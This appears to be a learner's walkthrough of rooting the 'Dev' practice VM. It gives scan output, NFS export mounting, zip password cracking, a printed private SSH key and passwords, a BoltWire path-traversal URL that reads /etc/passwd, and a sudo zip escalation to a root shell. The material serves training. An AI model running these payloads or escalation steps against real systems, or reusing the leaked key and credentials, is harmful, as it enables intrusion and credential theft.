---
title: Dev
tags:
  - fetus
---
## nmap results:
	
- `nmap -p- -T4 -A 10.0.2.7 > nmapAScan.txt`:
```sh title:"nmap -p- -T4 -A 10.0.2.7 > nmapAScan.txt" fold
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 16:30 EDT
Nmap scan report for 10.0.2.7
Host is up (0.0090s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44340/udp   mountd
|   100005  1,2,3      56201/tcp6  mountd
|   100005  1,2,3      58797/tcp   mountd
|   100005  1,2,3      59835/udp6  mountd
|   100021  1,3,4      35413/tcp6  nlockmgr
|   100021  1,3,4      36401/tcp   nlockmgr
|   100021  1,3,4      56771/udp   nlockmgr
|   100021  1,3,4      60901/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
36401/tcp open  nlockmgr 1-4 (RPC #100021)
48125/tcp open  mountd   1-3 (RPC #100005)
49809/tcp open  mountd   1-3 (RPC #100005)
58797/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:CC:22:A7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   8.98 ms 10.0.2.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.51 seconds
```
	
- `nmap -p- -sV -Pn 10.0.2.7 > nmapDScan.txt`: 
```sh title:"nmap -p- -sV -Pn 10.0.2.7 > nmapDScan.txt" fold
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 16:35 EDT
Nmap scan report for 10.0.2.7
Host is up (0.0056s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
36401/tcp open  nlockmgr 1-4 (RPC #100021)
48125/tcp open  mountd   1-3 (RPC #100005)
49809/tcp open  mountd   1-3 (RPC #100005)
58797/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:CC:22:A7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.55 seconds
```

## [[NFS]] enum:
- gonna check with [[metasploit]] cuz why not 
```sh
msf6 auxiliary(scanner/nfs/nfsmount) > run
[+] 10.0.2.7:111          - 10.0.2.7 Mountable NFS Export: /srv/nfs [172.16.0.0/12, 10.0.0.0/8, 192.168.0.0/16]
[*] 10.0.2.7:111          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- now with [[nmap]] as well to see if we get anything different 
- `nmap --script=nfs-showmount.nse 10.0.2.7 -p 111,2049`:
```sh title:"nmap --script=nfs-showmount.nse 10.0.2.7 -p 111,2049" fold
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 10:43 EDT
Nmap scan report for 10.0.2.7
Host is up (0.0064s latency).

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-showmount: 
|_  /srv/nfs 172.16.0.0/12 10.0.0.0/8 192.168.0.0/16
2049/tcp open  nfs
MAC Address: 08:00:27:CC:22:A7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
- now with [[showmount]] to learn how to use [[showmount]] 
- `showmount -e 10.0.2.7`:
```sh
Export list for 10.0.2.7:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```
- now lets get the file with [[mount]] 
- `mount -t nfs 10.0.2.7:/srv/nfs mountNFS`:`
```sh
mount -t nfs 10.0.2.7:/srv/nfs mountNFS
```
	
```sh
ls mountNFS 
save.zip
```
- so we got a zip file. lets unzip it with [[gzip]] or [[gunzip]]
- oops its a zip file. those only work for `.gz` files. gotta use [[unzip]] instead
```
unzip save.zip 
Archive:  save.zip
[save.zip] id_rsa password: 
password incorrect--reenter:
```
- shit needs a password. lets see if rockyou has anything. but before i do all that imma check the walkthrough to see if the tcm mentor did anything different
- yup used a specialized tool called [[fcrackzip]] to crack the zip file it seems instead of [[hydra]] 
- `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip`
```
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101
```
- hell yeah pass found 
```
java101
```
- lets unzip it now and see what we get 
- `id_rsa` file:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
-----END OPENSSH PRIVATE KEY-----
```
	
- `todo.txt` file:
```
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```
	
- possible uname: 
```
jp
```
	
- sidenote: `jp` loves java 
- connecting to ssh didnt work with the id_rsa since we dont know a password. doesnt seem like anything else can be done with [[NFS]] or [[SSH]] for now. lets do some [[http enumeration]] 
### root web pages:
- `http://10.0.2.7:80/`:
<img src="dev-port80.png">

- `http://10.0.2.7:8080/`:
<img src="Dev-port8080.png"> 

## dirbusting results: 
- `ffuf -u http://10.0.2.7:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > ffuf8080.txt`
	- [[Dev-ffufPort8080Result]] 
- dirs on port `8080`:
```
dev 
server-status
```

- `ffuf -u http://10.0.2.7:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > ffuf80.txt`
	- [[Dev-ffufPort80Result]] 
- dirs on port `80`:
```
public 
src 
app
vendor
extentions
server-status
```

### port `8080` web pages:
- `http://10.0.2.7:8080/dev/`:
<img src="DevPort8080DevDirectory.png">

- `http://10.0.2.7:8080/server-status`: (information disclosure spotted)
<img src="DevPort8080Server-status.png">

### port `80` web pages: 
- got a redirect to `http://10.0.2.7/public/bolt/userfirst` when i tried `http://10.0.2.7:80/public/`. its the same as the server status on port 8080 with the same information disclosure. 
- `http://10.0.2.7/src` shows a directory called `Site` went into it and found a file that shows a black page when clicked on. inspected the source and it was blank as well
<img src="DevPort80Src.png">

- `http://10.0.2.7/app/`: (seems interesting)
<img src="DevPort80App.png">
- found a `bolt.db` file in the database folder but there wasnt anything in there 
- lots of stuff in the `config` file 
<img src="DevPort80ConfigFile.png">

- `config.yml` file: [[Dev-Port80AppConfigYmlFile]] 
- damn got some juicy stuff in the yml file: 
```yml 
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```
- updated possible unames:
```
jp
bolt
```
- possible passwords:
```
java101
I_love_java
```
- there wasnt anything interesting in the `permissions.yml` file 
- nothing in the `menu.yml` either. im guessing we already got what we need 
- gonna try ssh bruteforcing with the two usernames again
- didnt work. wtf is this password for then. gonna take a look at what we already got 
- huh this uses boltwire on port `8080`. ig ill take a look at that
- theres a login page at `http://10.0.2.7:8080/dev/index.php?p=welcome&action=login`. seems like there may be LFI as well
- cant login as bolt or jp. imma try to see if theres any lfi on this
- `http://10.0.2.7:8080/dev/index.php?p=../../../../../../../../etc/passwd` says missing page. ig not. gonna search with [[metasploit]] to see if theres anything on `boltwire` 
```sh
┌──(root㉿kali)-[~/Desktop/projects/devBox]
└─# searchsploit boltwire
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                              | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                     | php/webapps/48411.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- bruh there is LFI. why didnt it work - _ - 
- oh it needs to be authenticated. how tf do i authenticate tho. login didnt work
- oh theres a register option at `http://10.0.2.7:8080/dev/index.php?p=action.register` 
- authenticated as:
```
skibidi:dobdob
```
- `http://10.0.2.7:8080/dev/index.php?p=../../../../../../../../../etc/passwd&id=skibidi` didnt return anything. 
- neither did `http://10.0.2.7:8080/dev/index.php?p=../../../../../../../../../etc/passwd`. gonna check the exploitdb page again to see if i missed anything 
- oh they used the `action.search` function, like this `index.php?p=action.search&action=../../../../../../../etc/passwd`
- yup `http://10.0.2.7:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd` worked yayyyy
- `etc/passwd`:
```sh
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin  
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false  
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```
- oh so `jp` is actually `jeanpaul` 
- couldnt get `etc/shadow` file tho 
- updated usernames: 
```
jeanpaul
bolt
```
- updated passwords: 
```
java101
I_love_java
```
- gonna brute force ssh AGAIN with these creds. istg if it doesnt work - _ -
- didnt work. probably has something to do with that `id_rsa` file i got earlier. gonna google how it ties in with [[SSH]] 
- oh yup i was right. gonna do `ssh -i id_rsa jeanpaul@10.0.2.7` and see if one of the passes work 
- the second one worked 
```
jeanpaul:I_love_java
```
## getting a shell and then root:
- theres nothing on the home directory. gonna check what jeanpaul can use as sudo with `sudo -l`
```sh
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```
- hmmm can run zip as root 
- how tf do i get root from this. gonna get a hint from the walkthrough
- oh `https://gtfobins.github.io/` is a thing
- `https://gtfobins.github.io/gtfobins/zip/`
- sudo priv escalation with zip:
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
- we got ROOOOOOOOOOOTTTTTTTTTTTTT
<img src="DevHasBeenRooted.png">
